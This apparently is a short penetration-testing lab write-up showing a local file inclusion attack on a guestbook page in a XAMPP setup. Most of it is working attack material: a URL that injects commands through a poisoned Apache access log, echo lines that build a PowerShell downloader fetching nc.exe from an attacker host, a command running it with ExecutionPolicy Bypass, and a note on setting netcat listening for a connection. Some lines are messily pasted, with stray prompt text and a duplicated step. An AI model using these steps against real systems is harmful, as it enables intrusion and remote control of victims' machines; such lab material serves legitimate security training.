1) Code Execution is straightforward in the LFI attack. By modifying the URL to include the following lines of code we are able to create the powershell script used in chapter 10 to download nc.exe. For example this is the last line of the script being added:

http://192.168.17.78/addguestbook.php?name=a&comment=b&cmd=echo $webclient.DownloadFile($url,$file) >>C:\wget.ps1&LANG=../../../../../../../xampp/apache/logs/access.log%00

echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1 C:\Users\Offsec> echo $url = "http://192.168.16.43/nc.exe" >>wget.ps1 C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1


powershell.exe -ExecutionPolicy Bypass -NoLogo - NonInteractive -NoProfile -File wget.ps1

Using this method we can download netcat to the windows box.

2) Further commands are run to have netcat start listening on an appropriate port for incoming requests

Once this is done we cna proceed with connecting from the attacking machine
